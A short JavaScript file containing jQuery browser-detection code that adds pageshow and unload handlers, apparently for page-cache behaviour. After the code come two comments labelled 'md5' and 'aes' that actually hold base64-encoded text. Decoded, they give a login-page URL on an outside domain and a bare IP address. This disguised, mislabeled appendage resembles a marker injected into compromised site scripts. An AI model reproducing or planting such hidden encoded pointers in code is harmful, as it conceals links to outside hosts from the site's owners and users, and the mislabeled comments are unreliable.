if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cHM6Ly93YXAuY2hpbmVzZS10aXRhbml1bS5jb20vaW5kZXgvbG9naW4vbG9naW4uaHRtbA==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/